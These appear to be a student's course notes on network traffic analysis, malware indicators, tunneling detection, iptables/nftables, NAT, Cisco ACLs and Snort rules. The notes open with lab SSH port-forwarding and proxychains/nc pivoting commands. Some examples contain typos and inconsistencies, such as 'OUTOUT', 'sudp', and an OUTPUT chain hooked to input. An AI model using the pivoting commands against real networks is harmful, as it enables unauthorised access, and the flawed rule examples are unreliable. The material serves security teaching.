 A:> ssh net1_student9@10.1.2.18 -p 2222

 IH 10901 ---> [A] 22 -----> [B] 2222

 ssh net1_student9@127.0.0.1 -p 10901 -L 10903:10.1.2.18:2222

 ssh net1_student9@127.0.0.1 -p 10930 -D 9050
 proxychains nc 127.0.0.1 54321 

![image](https://github.com/user-attachments/assets/e7991bcc-508a-426e-b260-b3338a168607)






# Network Analysis
https://net.cybbh.io/-/public/-/jobs/874023/artifacts/modules/networking/slides-v4/10_analysis.html

## TOOLS

Sensors

Inline 

TAP or MiTM Device

Test Access Point and Man in the Middle 

OutofBand (PASSIVE)

Switched Port Analyzer (SPAN)


## In-Line Sensors

    Placed between communicating devices to stop attacks

        Intrusion Prevention System (IPS)

        Firewall

    Impacts network latency


## Passive Sensor

    Monitors network segments

    Can detect attacks but cannot stop them

    Gets copies of network traffic

        Intrusion Detection System (IDS)

    Does not impact network latency 


## TAP

    Appliance placed between 2 network devices

    Best for packet collection with no data loss

    Must be placed "in line" of network traffic

    Not Scalable

    Will need several installed to capture traffic for other network segments

## MitM

    Attacker can use ARP or some other method/protocol

    Attackers can sniff or manipulate traffic that flows through them

    Typically must be on the same network as the victim

    Traffic capture is dependent on the attacker’s system and bandwidth

## SPAN

    Configured on the network Switch

    Best for packet collection of traffic from several switch ports at once

    Scalable

    Can have a high degree of packet loss

    Places burden on the network Switch


## Fingerprinting and Host Identification

    Variances in the RFC implementation for different OS’s and systems enables the capability for fingerprinting

    Tools used for fingerprinting and host identification can be used passively(sniffing/fingerprinting) or actively(scanning)


Fingerprinting

Active OS fingerprinting

        Easier

        Send packets to the target and monitor response

        Tools:

            Nmap

            Xprobe2


Passive OS fingerprinting

        More difficult

        Rely on sniffing packets

        Tools:

            p0f

            Ettercap

            PRADS

            sinfp3

P0F (Passive OS Fingerprinting)

    Looks at variations in initial TTL, fragmentation flag, default IP header packet length, window size, and TCP options

    Configuration stored in:

 /etc/p0f/p0f.fp


## Open Ports and Protocols

    Known Windows/Linux ports

    Known Windows/Linux protocols

    Banner grab service ports


Known Windows and Linux Ports

    Windows

        88 - Kerberos / Domain Controller

        137/138/139 - NetBIOS

        445 - SMB

    Linux

        22 - SSH

        111 - SUN RPC


 Ephemeral Ports

    IANA 49152–65535

    Linux 32768–60999

    Windows XP 1025–5000

    Win 7/8/10 use IANA

    Win Server 2008 1025–60000

    Sun Solaris 32768–65535



## Protocol specific identifiers

    HTTP: User-agent strings

    SSH: Initial connection

    NetBIOS Name Service




## Hacker Methodologies

    Footprinting

    Network scanning

    Network Enumeration

    Vulnerability Assessment

	CYBER KILL CHAIN
    ![image](https://github.com/user-attachments/assets/3e397f10-24d4-4bbf-9c9b-cd54de1fd0c2)
	MITRE ATT&CK
    ![image](https://github.com/user-attachments/assets/e99db0bf-460e-479c-a1ee-7c17635c2e14)
	MITRE D3FEND
    ![image](https://github.com/user-attachments/assets/24c333e8-3c58-4676-b4e9-73bdcf262454)
	THE DIAMOND MODEL
    ![image](https://github.com/user-attachments/assets/92e4ca91-203c-4d5b-bbaf-28dc9cca4f24)
	NIST CYBER SECURITY FRAMEWORK
    ![image](https://github.com/user-attachments/assets/d1708e89-1f78-4394-b03f-b75466cdde20)



## INDICATORS

    Indicator of Attack (IOA)

        Proactive

        A series of actions that are suspicious together

        Focus on Intent

        Looks for what must happen

            Code execution. persistence, lateral movement, etc.


Anomaly Detection

    Indicator of Compromise (IOC)

        Reactive

        Forensic Evidence

        Provides Information that can change

            Malware, IP addresses, exploits, signatures



Some Indicators

    .exe/executable files

    NOP sled

    Repeated Letters

    Well Known Signatures

    Mismatched Protocols

    Unusual traffic

    Large amounts of traffic/ unusual times



Signs of IOA

    Destination IP/Ports

    Public Servers/DMZs

    Off-Hours

    Network Scans

    Alarm Events

    Malware Reinfection

    Remote logins

    High amounts of some protocols

Signs of IOC

    Unusual traffic outbound

    Anomalous user login or account use

    Size of responses for HTML

    High number of requests for the same files

    Using non-standard ports/ application-port mismatch

    Writing changes to the registry/system files

    Unexpected/unusual patching or tasks


## Malware



Adware/Spyware

    large amounts of traffic/ unusual traffic

    IOA

        Destinations

    IOC

        Unusual traffic outbound

 Virus

    phishing/ watering hole

    IOA

        Alarm Events, Email protocols

    IOC

        Changes to the registry/ system files

 Worm

    phishing/ watering hole

    IOA

        Alarm events

    IOC

        changes to registry/ system files

 Trojan

    beaconing

    IOA

        Destinations

    IOC

        Unusual traffic outbound, unusual tasks, changes to registry/ system files

 Rootkit

    IOA

        Malware reinfection

    IOC

        Anomalous user login/ account use

 Backdoor

    IOA

        Remote logins

    IOC

        Anomalous user login/ account use

 Botnets

    large amounts of IPs

    IOA

        Destinations, remote logins

    IOC

        Unusual tasks, anomalous user login/ account use

     Anomalous user login or account use

    Size of responses for HTML

    High number of requests for the same files

    Using non-standard ports/ application-port mismatch

    Writing changes to the registry/system files

    Unexpected/unusual patching or tasks

Backdoor

    IOA

        Remote logins

    IOC

        Anomalous user login/ account use

Botnets

    large amounts of IPs

    IOA

        Destinations, remote logins

    IOC

        Unusual tasks, anomalous user login/ account use

Polymorphic/Metamorphic Malware

    Depends on the malware type/class

Ransomware

    IOA

        Destinations, Ports, Malware reinfection

    IOC

        Unusual traffic outbound, non-standard ports, unusual tasks

 Mobile Code

    IOA

        Depends on the malware type/class

 BIOS/Firmware Malware

    IOA

        Malware reinfection

    IOC

        Depends on the malware type/class

 # Determine Network Anomalies through Traffic Analysis

 ## ICMP Tunneling
 ![image](https://github.com/user-attachments/assets/ae578f2f-c85a-4e83-9239-6bb1f4d9408f)
ICMP Tunneling

    ICMP PING uses Type 8 and Type 0

    Both should be:

        1 for 1

        Same size and payload

    Look out for:

        Request/Reply imbalances

        Abnormal/different payloads

## DNS Tunneling

![image](https://github.com/user-attachments/assets/7ddd7475-98de-4992-b6d8-b75f821188d8)
DNS Tunneling

    DNS uses Query/Response

        1 Query typically gets 1 response

    Look out for:

        Query/Response imbalances

        Abnormal/different payloads

        Continuous Queries

## HTTP(S) Tunneling

    HTTP is "bursty" in nature

    Client issues request and the server responds

    Look out for:

        Steady connections

        HTTPs you will need to check session establishment for abnormalities


## Beaconing

![image](https://github.com/user-attachments/assets/a42a37ee-cfc4-4300-a292-fd39921b3e6b)

    Call back to the C&C server

    Gets/sends commands from/to C&C

    Look out for:

        Beacon Timing

            Commonly at regular intervals

        Beacon Size

            Check-Ins may not have any payloads

            Orders will have payloads



# Access Control-Host

## Practical applications for filtering

    Network Traffic - allow or block traffic to/from remote locations.

    Email addresses - to block unwanted email to reduce risk or increase productivity

    Computer applications in an organization environment - for security from vulnerable software

    MAC filtering - also for security to allow only specific computers access to a network



## Network Traffic Filtering Concepts

    Protocols Operation

    Header Analysis

    Network Reconnaissance

    Tunnel Analysis

    IOA and IOC

    Malware Analysis



## Defense in Depth

    Perimeter Security

    Network Security

    Endpoint Security

    Application and OS Security

    Data Security




## Default policies

    Explicit - precisely and clearly expressed

    Implicit - implied or understood



## Block-Listing vs Allow-Listing

    Block-Listing (Formerly Black-List)

        Implicit ACCEPT

        Explicit DENY

    Allow-Listing (Formerly White-List)

        Implicit DENY

        Explicit ACCEPT



## Discuss filtering device types

![image](https://github.com/user-attachments/assets/057052ff-b3f8-4738-8191-bc38a79160b8)



## Operation Modes


![image](https://github.com/user-attachments/assets/fe396583-9581-4b5f-979d-a7f7de655fdc)



## Firewall Filtering Methods

    Stateless (Packet) Filtering (L3+4)

    Stateful Inspection (L4)

    Circuit-Level (L5)

    Application Layer (L7)

    Next Generation (NGFW) (L7)


## Software vs Hardware vs Cloud Firewalls

    Software - typically host-based

    Hardware - typically network-based

    Cloud - provided as a service


## Traffic Directions

    A to B

        Traffic originating from the localhost to the remote-host

            You (the client) are the client sending traffic to the server.

        Return traffic from that remote-host back to the localhost.

            The server is responding back to you (the client).


    B to A

        Traffic originating from the remote-host to the localhost.

            A client is trying to connect to you (the server)

        Return traffic from the localhost back to the remote-host.

            You (the server) are responding back to the client.****



![image](https://github.com/user-attachments/assets/30e0d6a7-a284-4901-8890-7a344e67d67c)

![image](https://github.com/user-attachments/assets/18518707-8f7b-4f5c-bea8-411da88614be)


## Understand Host Based Filtering

Windows, Linux, or MAC

    Windows - Norton, Mcafee, ZoneAlarm, Avast, etc.

    Linux - iptables, nftables, UFW, firewalld.

    MAC - Little Snitch, LuLu, Vallum, etc.


## Netfilter framework

Made to provide:

    packet filtering

    stateless/stateful Firewalls

    network address and port translation (NAT and PAT)

    other packet manipulation




## Netfilter hooks - > Chain

    NF_IP_PRE_ROUTING → PREROUTING

    NF_IP_LOCAL_IN → INPUT

    NF_IP_FORWARD → FORWARD

    NF_IP_LOCAL_OUT → OUTPUT

    NF_IP_POST_ROUTING → POSTROUTING

![image](https://github.com/user-attachments/assets/bdbbf5b6-a609-4310-9392-24dc85eca3da)

## Netfilter paradigm

    tables - contain chains

    chains - contain rules

    rules - dictate what to match and what actions to perform on packets when packets match a rule


## Separate applications

Netfilter created several (separate) applications to filter on different layer 2 or layer 3+ protocols.

    iptables - IPv4 packet administration

    ip6tables - IPv6 packet administration

    ebtables - Ethernet Bridge frame table administration

    arptables - arp packet administration


## Tables of iptables

    filter - default table. Provides packet filtering.

    nat - used to translate private ←→ public address and ports.

    mangle - provides special packet alteration. Can modify various fields header fields.

    raw - used to configure exemptions from connection tracking.

    security - used for Mandatory Access Control (MAC) networking rules.

## Chains of iptables

    PREROUTING - packets entering NIC before routing

    INPUT - packets to localhost after routing

    FORWARD - packets routed from one NIC to another. (needs to be enabled)

    OUTPUT - packets from localhost to be routed

    POSTROUTING - packets leaving system after routing

## Chains assigned to each Table

    filter - INPUT, FORWARD, and OUTPUT

    nat - PREROUTING, POSTROUTING, INPUT, and OUTPUT

    mangle - All chains

    raw - PREROUTING and OUTPUT

    security - INPUT, FORWARD, and OUTPUT

## Common iptable options (CMD)

-t - Specifies the table. (Default is filter)
-A - Appends a rule to the end of the list or below specified rule
-I - Inserts the rule at the top of the list or above specified rule
-R - Replaces a rule at the specified rule number
-D - Deletes a rule at the specified rule number
-F - Flushes the rules in the selected chain
-L - Lists the rules in the selected chain using standard formatting
-S - Lists the rules in the selected chain without standard formatting
-P - Sets the default policy for the selected chain
-n - Disables inverse lookups when listing rules
--line-numbers - Prints the rule number when listing rules
-p - Specifies the protocol
-i - Specifies the input interface
-o - Specifies the output interface
--sport - Specifies the source port
--dport - Specifies the destination port
-s - Specifies the source IP
-d - Specifies the destination IP
-j - Specifies the jump target action

## iptables syntax (CMD)

iptables -t [table] -A [chain] [rules] -j [action]

    Table: filter*, nat, mangle

    Chain: INPUT, OUTPUT, PREROUTING, POSTROUTING, FORWARD

-i [ iface ]

-o [ iface ]

-s [ ip.add | network/CIDR ]

-d [ ip.add | network/CIDR ]

-p icmp [ --icmp-type type# { /code# } ]

-p tcp [ --sport | --dport { port1 |  port1:port2 } ]

-p tcp [ --tcp-flags SYN,ACK,PSH,RST,FIN,URG,ALL,NONE ]

-p udp [ --sport | --dport { port1 | port1:port2 } ]

-m state --state NEW,ESTABLISHED,RELATED,UNTRACKED,INVALID

-m mac [ --mac-source | --mac-destination ] [mac]

-p [tcp|udp] -m multiport [ --dports | --sports | --ports { port1 | port1:port15 } ]

-m bpf --bytecode [ 'bytecode' ]

-m iprange [ --src-range | --dst-range { ip1-ip2 } ]


    ACCEPT - Allow the packet

    REJECT - Deny the packet (send an ICMP reponse)

    DROP - Deny the packet (send no response)

-j [ ACCEPT | REJECT | DROP ]


## Modify iptables (CMD)

    Flush table

    iptables -t [table] -F

    Change default policy

    iptables -t [table] -P [chain] [action]

    Lists rules with rule numbers

    iptables -t [table] -L --line-numbers

    Lists rules as commands interpreted by the system

    iptables -t [table] -S
  
    Inserts rule before Rule number

    iptables -t [table] -I [chain] [rule num] [rules] -j [action]

    Replaces rule at number

    iptables -t [table] -R [chain] [rule num] [rules] -j [action]

    Deletes rule at number

    iptables -t [table] -D [chain] [rule num]





## IPTABLES SYNTAX (CMD)


sudo iptables -L
 
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination       


sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination   



sudo iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh



sudo iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh


sudo iptables -A INPUT -p tcp -m multiport --ports 6010,6011,6012 -j ACCEPT
sudo iptables -A OUTPUT -p tcp -m multiport --ports 6010,6011,6012 -j ACCEPT

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             multiport ports 6010,6011,6012

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             multiport ports 6010,6011,6012


sudo iptables -P INPUT DROP
sudo iptables -P OUTOUT DROP

Chain INPUT (policy DROP)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             multiport ports 6010,6011,6012

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy DROP)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             multiport ports 6010,6011,6012

sudo iptables -A INPUT -s 172.16.40.10 -j ACCEPT
sudo iptables -A OUTPUT -d 172.16.40.10 -j ACCEPT


Chain INPUT (policy DROP)
target     prot opt source               destination         
DROP       all  --  172.16.82.112        anywhere            
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             multiport ports 6010,6011,6012
ACCEPT     all  --  172.16.40.10         anywhere            

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy DROP)
target     prot opt source               destination         
DROP       all  --  anywhere             172.16.82.112       
ACCEPT     tcp  --  anywhere             anywhere             tcp spt:ssh
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
ACCEPT     tcp  --  anywhere             anywhere             multiport ports 6010,6011,6012
ACCEPT     all  --  anywhere             172.16.40.10 



sudo iptables -L -v
Chain INPUT (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 DROP       all  --  any    any     172.16.82.112        anywhere            
 1422  103K ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh
   98  6762 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp spt:ssh
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             multiport ports 6010,6011,6012
    8   480 ACCEPT     all  --  any    any     172.16.40.10         anywhere            

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain OUTPUT (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 DROP       all  --  any    any     anywhere             172.16.82.112       
  755 81888 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp spt:ssh
  137  7060 ACCEPT     tcp  --  any    any     anywhere             anywhere             tcp dpt:ssh
    0     0 ACCEPT     tcp  --  any    any     anywhere             anywhere             multiport ports 6010,6011,6012
    8   320 ACCEPT     all  --  any    any     anywhere             172.16.40.10  



sudo iptables-save > myrules.conf
ls
myrules.conf
sudp iptables-restore < myrules.conf -v


sudo iptables -F 




## NF TABLES SYNTAX (CMD)

sudo nft add table ip IP4
table ip IP4 {
}

sudo nft list ruleset

sudo nft add chain ip IP4 INPUT { type filter hook input priority 0\; policy accept \; }
sudo nft add chain ip IP4 OUTPUT { type filter hook input priority 0\; policy accept \; }


table ip IP4 {
	chain INPUT {
		type filter hook input priority 0; policy accept;
	}

	chain OUTPUT {
		type filter hook input priority 0; policy accept;
	}
}

sudo nft insert rule ip IP4 INPUT tcp dport 22 accept
sudo nft insert rule ip IP4 INPUT tcp sport 22 accept
sudo nft insert rule ip IP4 OUTPUT tcp dport 22 accept
sudo nft insert rule ip IP4 OUTPUT tcp sport 22 accept

table ip IP4 {
	chain INPUT {
		type filter hook input priority 0; policy accept;
		tcp sport ssh accept
		tcp dport ssh accept
	}

	chain OUTPUT {
		type filter hook input priority 0; policy accept;
		tcp dport ssh accept
		tcp sport ssh accept
	}
}


sudo nft add chain ip IP4 INPUT { \; policy drop \; }
sudo nft add chain ip IP4 OUTPUT { \; policy drop \; }

table ip IP4 {
	chain INPUT {
		type filter hook input priority 0; policy drop;
		tcp sport ssh accept
		tcp dport ssh accept
	}

	chain OUTPUT {
		type filter hook input priority 0; policy drop;
		tcp dport ssh accept
		tcp sport ssh accept
	}
}




sudo nft insert rule ip IP4 INPUT ip saddr 172.16.82.106 drop
sudo nft insert rule ip IP4 OUTPUT ip daddr 172.16.82.106 drop
sudo nft insert rule ip IP4 OUTPUT ip daddr 172.16.40.10 accept
sudo nft insert rule ip IP4 INPUT ip saddr 172.16.40.10 accept

table ip IP4 {
	chain INPUT {
		type filter hook input priority 0; policy drop;
		ip saddr 172.16.40.10 accept
		ip saddr 172.16.82.106 drop
		tcp sport ssh accept
		tcp dport ssh accept
	}

	chain OUTPUT {
		type filter hook input priority 0; policy drop;
		ip daddr 172.16.40.10 accept
		ip daddr 172.16.82.106 drop
		tcp dport ssh accept
		tcp sport ssh accept
	}
}



$ sudo nft insert rule ip HEADER input tcp dport { 6010, 6012, 6011 } ct state { new, established } accept
$ sudo nft insert rule ip HEADER input tcp sport { 6010, 6012, 6011 } ct state { new, established } accept
$ sudo nft insert rule ip HEADER output tcp dport { 6010, 6012, 6011 } ct state { new, established } accept
$ sudo nft insert rule ip HEADER output tcp sport { 6010, 6012, 6011 } ct state { new, established } accept
$ sudo nft list ruleset -a
table ip HEADER {
	chain input {
		type filter hook input priority 0; policy drop;
		ip saddr 172.16.82.106 drop # handle 7
		tcp sport ssh accept # handle 4
		tcp dport ssh accept # handle 3
		ip saddr 172.16.40.10 accept # handle 10
		tcp dport { 6010, 6012, 6011 } ct state { new, established } accept # handle 11
		tcp sport { 6012, 6010, 6011 } ct state { new, established } accept # handle 12
	}

	chain output {
		type filter hook output priority 0; policy drop;
		ip daddr 172.16.82.106 drop # handle 8
		tcp sport ssh accept # handle 6
		tcp dport ssh accept # handle 5
		ip daddr 172.16.40.10 drop # handle 9
		tcp dport { 6011, 6010, 6012 } ct state { new, established } accept # handle 13
		tcp sport { 6012, 6011, 6010 } ct state { new, established } accept # handle 14
	}

}



# NAT

## SOURCE NAT (IPTABLES)


![image](https://github.com/user-attachments/assets/2e91feae-f30f-47c1-ad2e-ef1f25dd8d24)

iptables -t nat -A POSTROUTING -o eth0 -s 192.168.0.1 -j SNAT --to 1.1.1.1




![image](https://github.com/user-attachments/assets/3f24e604-0423-41d2-811f-50dc67994b9f)


iptables -t nat -A POSTROUTING -p tcp -o eth0 -s 192.168.0.1 -j SNAT --to 1.1.1.1:9001


iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE


## DESTINATION NAT (IPTABLES)


![image](https://github.com/user-attachments/assets/f3831481-0cea-4635-9606-834aeac26996)

iptables -t nat -A PREROUTING -i eth0 -d 8.8.8.8 -j DNAT --to 10.0.0.1


iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 22 -j DNAT --to 10.0.0.1:22
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to 10.0.0.2:80
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j DNAT --to 10.0.0.3:443
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080






## Creating nat tables and chains (NFT)


    Create the NAT table

    nft add table ip NAT

    Create the NAT chains

    nft add chain ip NAT PREROUTING { type nat hook prerouting priority 0 \; }

    nft add chain ip NAT POSTROUTING { type nat hook postrouting priority 0 \; }****


## Source NAT (NFT)


nft add rule ip NAT POSTROUTING ip saddr 10.10.0.40 oif eth0 snat 144.15.60.11

nft add rule ip NAT POSTROUTING oif eth0 masquerade



## Destination NAT (NFT)


nft add rule ip NAT PREROUTING iif eth0 ip daddr 144.15.60.11 dnat 10.10.0.40

nft add rule ip NAT PREROUTING iif eth0 tcp dport { 80, 443 } dnat 10.1.0.3

nft add rule ip NAT PREROUTING iif eth0 tcp dport 80 redirect to 8080



## IPTABLES MANGLE


iptables -t mangle -A POSTROUTING -o eth0 -j TTL --ttl-set 128

iptables -t mangle -A POSTROUTING -o eth0 -j DSCP --set-dscp 26

nft add table ip MANGLE

nft add chain ip MANGLE INPUT {type filter hook input priority 0 \; policy accept \;}

nft add chain ip MANGLE OUTPUT {type filter hook output priority 0 \; policy accept \;}

nft add rule ip MANGLE OUTPUT oif eth0 ip ttl set 128

nft add rule ip MANGLE OUTPUT oif eth0 ip dscp set 26




 



# ACCESS CONTROL NETWORK


## Interpret a data flow diagram given a set of firewall rules

![image](https://github.com/user-attachments/assets/cfc0a352-00b3-4e5b-a417-c375ff9393e8)


## Typical locations for filtering devices

    IPS

    Firewalls

    Routers

    Switches


## Filtering Device Placement example

![image](https://github.com/user-attachments/assets/fb91f3bf-772a-4955-85d7-ce90a5bd97dd)



## Interpret CISCO Access Control List (ACL)

ACL numbering & naming conventions

![image](https://github.com/user-attachments/assets/00f74f6b-8ae3-42a9-bf82-8a4d8ff244ac)


     
## Syntax to create Access Lists

Demo> enable #enter privileged exec mode

Demo# configure terminal #enter global config mode

Demo(config)# access-list 37 ... (output omitted) ...

Demo(config)# ip access-list standard block_echo_request

Demo(config)# access-list 123  ... (output omitted) ...

Demo(config)# ip access-list extended zone_transfers

What types of ACLs were created?




## Standard Numbered ACL Syntax

router(config)# access-list {1-99 | 1300-1999}  {permit|deny}  {source IP add}
                {source wildcard mask}

router(config)#  access-list 10 permit host 10.0.0.1

router(config)#  access-list 10 deny 10.0.0.0 0.255.255.255

router(config)#  access-list 10 permit any


## Standard Named ACL Syntax

router(config)# ip access-list standard [name]

router(config-std-nacl)# {permit | deny}  {source ip add}  {source wildcard mask}

router(config)#  ip access-list standard CCTC-STD

router(config-std-nacl)#  permit host 10.0.0.1

router(config-std-nacl)#  deny 10.0.0.0 0.255.255.255

router(config-std-nacl)#  permit any


## Extended Numbered ACL Syntax

router(config)# access-list {100-199 | 2000-2699} {permit | deny} {protocol}
                {source IP add & wildcard} {operand: eq|lt|gt|neq}
                {port# |protocol} {dest IP add & wildcard} {operand: eq|lt|gt|neq}
                {port# |protocol}

router(config)# access-list 144 permit tcp host 10.0.0.1 any eq 22

router(config)# access-list 144 deny tcp 10.0.0.0 0.255.255.255 any eq telnet

router(config)# access-list 144 permit icmp 10.0.0.0 0.255.255.255 192.168.0.0
                0.0.255.255 echo

router(config)# access-list 144 deny icmp 10.0.0.0 0.255.255.255 192.168.0.0
                0.0.255.255 echo-reply

router(config)# access-list 144 permit ip any any


## Extended Named ACL Syntax

router(config)# ip access-list extended  [name]

router(config-ext-nacl)# [sequence number] {permit | deny} {protocol}
                         {source IP add & wildcard} {operand: eq|lt|gt|neq}
                         {port# |protocol} {dest IP add & wildcard} {operand:
                         eq|lt|gt|neq} {port# |protocol}

router(config)# ip access-list extended CCTC-EXT

router(config-ext-nacl)# permit tcp host 10.0.0.1 any eq 22

router(config-ext-nacl)# deny tcp 10.0.0.0 0.255.255.255 any eq telnet

router(config-ext-nacl)# permit icmp 10.0.0.0 0.255.255.255 192.168.0.0
                         0.0.255.255 echo

router(config-ext-nacl)# deny icmp 10.0.0.0 0.255.255.255 192.168.0.0
                         0.0.255.255 echo-reply

router(config-ext-nacl)# permit ip any any


## ACLs can be used for:

    Filtering traffic in/out of a network interface.

    Permit or deny traffic to/from a router VTY line.

    Identify authorized users and traffic to perform NAT.

    Classify traffic for Quality of Service (QoS).

    Trigger dial-on-demand (DDR) calls.

    Control Bandwidth.

    Limit debug command output.

    Restrict the content of routing updates.



## ACLs rules

    One ACL per interface, protocol and direction

    Must contain one permit statement

    Read top down

    Standard ACL generally applied closer to traffic destination

    Extended ACL generally applied closer to traffic source

    Inbound processed before routing

    Outbound processed after routing

    Does not apply for SSH or telnet traffic to device

    Does not apply to traffic from the device

    Only standard ACLs on VTY lines



## Apply an ACL to an interface or line

router(config)#  interface {type} {mod/slot/port}

router(config)#  ip access-group {ACL# | name} {in | out}

router(config)#  interface s0/0/0

router(config-if)#  ip access-group 10 out

router(config)#  interface g0/1/1

router(config-if)#  ip access-group CCTC-EXT in

router(config)#  line vty 0 15

router(config)#  access-class CCTC-STD in

     

## Standard ACLs and extended ACLs 

Standard closest to destination

Extended closest to source



## Contrast Intrusion Detection Systems and Intrusion Prevention Systems

    Placement

        In line

        or not


One applys countermeasures
the other applies


## Common IDS and IPS



![image](https://github.com/user-attachments/assets/0df27d37-d048-42ce-8141-bfedb7993dd4)




## Discuss Signature vs Behavior based detection

    Recognition Methods

        Signature

        Heuristic aka Behavioral


 ## Construct advanced IDS (snort) rules

    Installation Directory

        /etc/snort

    Configuration File

        /etc/snort/snort.conf

    Rules Directory

        /etc/snort/rules

## Construct advanced IDS (snort) rules

    Rule naming

        [name].rules

    Default Log Directory

        /var/log/snort

     Common line switches

        -D - to run snort as a daemon

        -c - to specify a configuration file when running snort

        -l - specify a log directory

        -r - to have snort read a pcap file

    To run snort as a Daemon

    sudo snort -D -c /etc/snort/snort.conf -l /var/log/snort

    To run snort against a PCAP

    sudo snort -c /etc/snort/rules/file.rules -r file.pcap
 


 ## Snort IDS/IPS rule - Header

[action] [protocol] [s.ip] [s.port] [direction] [d.ip] [d.port] ( match conditions ;)

* Action - alert, log, pass, drop, or reject
* Protocol - TCP, UDP, ICMP, or IP
* Source IP address - one IP, network, [IP range], or any
* Source Port - one, [multiple], any, or [range of ports]
* Direction - source to destination or both
* Destination IP address - one IP, network, [IP range], or any
* Destination port - one, [multiple], any, or [range of ports]

## Snort Rule Options

    Categories

        General

        Payload detection

        Non-Payload detection

        Post detection

        Thresholding and suppression


 ## Snort IDS/IPS General rule options:

* msg:"text" - specifies the human-readable alert message
* reference: - links to external source of the rule
* sid: - used to uniquely identify Snort rules (required)
* rev: - uniquely identify revisions of Snort rules
* classtype: - used to describe what a successful attack would do
* priority: - level of concern (1 - really bad, 2 - badish, 3 - informational)
* metadata: - allows a rule writer to embed additional information about the rule

## Snort IDS/IPS Payload detection options:

* content:"text" - looks for a string of text.
* content:"|binary data|" - to look for a string of binary HEX
* nocase - modified content, makes it case insensitive
* depth: - specify how many bytes into a packet Snort should search for the
           specified pattern
* offset: - skips a certain number of bytes before searching (i.e. offset: 12)
* distance: - how far into a packet Snort should ignore before starting to
              search for the specified pattern relative to the end of the
              previous pattern match
* within: - modifier that makes sure that at most N bytes are between pattern
            matches using the content keyword


## Snort IDS/IPS Non-Payload detection options:

* flow: - direction (to/from client and server) and state of connection
         (established, stateless, stream/no stream)
* ttl: - The ttl keyword is used to check the IP time-to-live value.
* tos: - The tos keyword is used to check the IP TOS field for a specific value.
* ipopts: - The ipopts keyword is used to check if a specific IP option is present
* fragbits: - Check for R|D|M ip flags.
* dsize: - Test the packet payload size
* seq: - Check for a specific TCP sequence number
* ack: - Check for a specific TCP acknowledge number.
* flags: - Check for E|C|U|A|P|R|S|F|0 TCP flags.
* itype: - The itype keyword is used to check for a specific ICMP type value.
* icode: - The icode keyword is used to check for a specific ICMP code value.

## Snort IDS/IPS Post detection options:

* logto: - The logto keyword tells Snort to log all packets that trigger this rule to
           a special output log file.
* session: - The session keyword is built to extract user data from TCP Sessions.
* react: - This keyword implements an ability for users to react to traffic that
           matches a Snort rule by closing connection and sending a notice.
* tag: - The tag keyword allow rules to log more than just the single packet that
         triggered the rule.
* detection_filter - defines a rate which must be exceeded by a source or destination
                     host before a rule can generate an event.

## Snort IDS/IPS Thresholding and suppression options:

threshold: type [limit | threshold | both], track [by_src | by_dst],
count [#], seconds [seconds]

* limit - alerts on the 1st event during defined period then ignores the rest.
* threshold - alerts every [x] times during defined period.
* both - alerts once per time internal after seeing [x] amount of occurrences
         of event. It then ignores all other events during period.
* track - rate is tracked either by source IP address, or destination IP address
* count - number of rule matching in [s] seconds that will cause event_filter
